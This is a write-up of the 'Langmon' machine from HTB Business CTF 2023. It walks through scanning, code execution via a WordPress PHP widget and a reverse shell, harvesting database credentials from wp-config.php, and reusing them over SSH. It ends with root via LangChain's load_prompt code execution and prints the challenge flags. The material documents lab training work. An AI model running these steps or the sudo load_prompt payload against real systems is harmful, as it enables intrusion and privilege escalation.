---
layout: post
title: HTB Business CTF 2023 Writeup - FullPwn - Langmon
date: 2023-07-19
type: post
tags:
- Writeup
- Hacking
- BusinessCTF
- CTF
permalink: /2023/07/HTBBusinessCTF/Langmon
img: 2023/07/HTBBusinessCTF/Langmon/Langmon.png
---

In this challenge I used a Wordpress plugin to get code execution, and a vulnerability in [LangChain](https://docs.langchain.com/docs/) to get root.

> Very Easy

## Enumeration

I started the machine by looking for open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.246.135:22
Open 10.129.246.135:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

Nmap scan report for target (10.129.246.135)
Host is up, received user-set (0.28s latency).
Scanned at 2023-07-16 12:09:57 EDT for 93s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://langmon.htb/
| http-methods:
|_  Supported Methods: GET OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: langmon.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.14 seconds
```

There were two:
* 22 (SSH)
* 80 (HTTP)

The website was redirecting to 'langmon.htb', I added the domain to my hosts file.

I ran scans for subdomains and hidden pages. It did not find anything interesting.

## Website

I opened a browser to look at the website.

![Wordpress site](/assets/images/2023/07/HTBBusinessCTF/Langmon/Langmon.png "Wordpress Site")

It was a Wordpress site, so I scanned it with `wpscan`.

```bash
$ wpscan --url http://langmon.htb/ -e ap,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://langmon.htb/ [10.129.246.135]
[+] Started: Sun Jul 16 12:15:50 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://langmon.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://langmon.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://langmon.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://langmon.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://langmon.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2.2 identified (Latest, released on 2023-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://langmon.htb/index.php/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://langmon.htb/, Match: 'WordPress 6.2.2'

[+] WordPress theme in use: astra
 | Location: http://langmon.htb/wp-content/themes/astra/
 | Last Updated: 2023-07-05T00:00:00.000Z
 | Readme: http://langmon.htb/wp-content/themes/astra/readme.txt
 | [!] The version is out of date, the latest version is 4.1.6
 | Style URL: http://langmon.htb/wp-content/themes/astra/style.css
 | Style Name: Astra
 | Style URI: https://wpastra.com/
 | Description: Astra is fast, fully customizable & beautiful WordPress theme suitable for blog, personal portfolio,...
 | Author: Brainstorm Force
 | Author URI: https://wpastra.com/about/?utm_source=theme_preview&utm_medium=author_link&utm_campaign=astra_theme
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://langmon.htb/wp-content/themes/astra/style.css, Match: 'Version: 4.1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[i] Plugin(s) Identified:

[+] elementor
 | Location: http://langmon.htb/wp-content/plugins/elementor/
 | Latest Version: 3.14.1 (up to date)
 | Last Updated: 2023-06-26T10:43:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.14.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://langmon.htb/wp-content/plugins/elementor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://langmon.htb/wp-content/plugins/elementor/readme.txt

[+] profile-builder
 | Location: http://langmon.htb/wp-content/plugins/profile-builder/
 | Last Updated: 2023-07-11T11:10:00.000Z
 | [!] The version is out of date, the latest version is 3.9.7
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 3.9.6 (90% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://langmon.htb/wp-content/plugins/profile-builder/assets/css/style-front-end.css?ver=3.9.6
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://langmon.htb/wp-content/plugins/profile-builder/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:11 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:11

[i] User(s) Identified:

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://langmon.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://langmon.htb/wp-json/oembed/1.0/embed?url=http://langmon.htb/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://langmon.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jul 16 12:16:51 2023
[+] Requests Done: 28
[+] Cached Requests: 36
[+] Data Sent: 7.482 KB
[+] Data Received: 1.159 MB
[+] Memory used: 260.988 MB
[+] Elapsed time: 00:01:00
```

The scan found one user and two plugins. The plugins had known vulnerabilities, but in older versions. I tried brute forcing the user's password with `wpscan`, but it failed.

The site had registration open. I created a user and looked at the dashboard. I was not allowed to do much. I could create draft posts, but not publish them.

It took me a while to find it, but when creating a post, there was a 'PHP + HTML' widget I could use. 

![PHP Code Execution](/assets/images/2023/07/HTBBusinessCTF/Langmon/PHP.png "PHP Code Execution")

This gave me code execution on the server. I used it to get a reverse shell.

![Reverse Shell](/assets/images/2023/07/HTBBusinessCTF/Langmon/RCE.png "Reverse Shell")

I started a netcat listener and applied this change. I got a shell on the server.

## Getting a User

I was on the server as 'www-data'. I looked into the Wordpress configuration (wp-config.php). It contains database credentials.

```php
<?php
define( 'DB_NAME', 'pwndb' );
define( 'DB_USER', 'wordpress_user' );
define( 'DB_PASSWORD', 'SNJQvwWHCK' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
define('AUTH_KEY',         '~vLELa>,uQNv8Qi07@&fPoP K?uH5z) [#[#{E>_+NeZu}8GrCWE=:4R>^PLSVUU');

...
```

Before connecting to the database, I wanted to check if the found password worked with a user. I read the passwd file to find users.

```bash
www-data@langmon:/var/www/langmon.htb$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:121:MySQL Server,,,:/nonexistent:/bin/false
developer:x:1000:1000:,,,:/home/developer:/bin/bash
```

There was one, I tried connecting as them with the database password.

```bash
$ ssh developer@target
The authenticity of host 'target (10.129.246.135)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
developer@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  7 01:02:28 PM UTC 2023

  System load:  1.111328125       Processes:             159
  Usage of /:   72.6% of 5.81GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.129.229.38
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

developer@langmon:~$ cat user.txt
HTB{4lw4y5_upd473_y0ur_plu61n5}
```

It worked, and I got the user flag.

## Getting root

I looked if the user could run anything with `sudo`.

```bash
developer@langmon:~$ sudo -l
[sudo] password for developer:
Sorry, try again.
[sudo] password for developer:
Matching Defaults entries for developer on langmon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on langmon:
    (root) /opt/prompt_loader.py
```

They could run a Python script. I looked at what the script did.

```python
developer@langmon:~$ cat /opt/prompt_loader.py
#!/usr/bin/python3
import sys
from langchain.prompts import load_prompt

def load(file):
        try:
                load_prompt(file)
        except:
                print("There is something wrong with the prompt file.")

if __name__ == "__main__":
        if len(sys.argv) != 2:
                print("Usage: prompt_loader.py <prompt_file_path>")
        else:
                file = sys.argv[1]
                load(file)
```

The script took a file as parameter and passed it to `load_prompt`. I search for vulnerabilities and found that it would [execute any Python code in the file](https://tutorialboy.medium.com/langchain-arbitrary-command-execution-cve-2023-34541-8f56fe2737b0).

I created a script that launched bash.

```python
#!/usr/bin/python3

import os
os.system("/bin/bash")
```

And called the loader to become root.

```bash
developer@langmon:~$ sudo /opt/prompt_loader.py test.py

root@langmon:/home/developer# whoami
root

root@langmon:/home/developer# cat /root/root.txt
HTB{7h3_m4ch1n35_5p34k_w3_h34r}
```